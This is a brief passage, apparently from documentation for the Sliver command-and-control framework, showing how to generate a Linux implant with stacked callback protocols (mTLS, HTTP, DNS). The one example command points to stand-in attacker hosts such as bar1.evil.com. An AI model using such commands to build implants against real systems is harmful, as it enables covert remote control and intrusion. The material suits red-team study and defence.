...
You can also stack the C2 configuration with multiple protocols:
	generate --os linux --mtls example.com,domain.com --http bar1.evil.com,bar2.attacker.com --dns baz.Oni-kuki.com
...
For more information: https://github.com/Oni-kuki/sliver/wiki/External-Builders
`
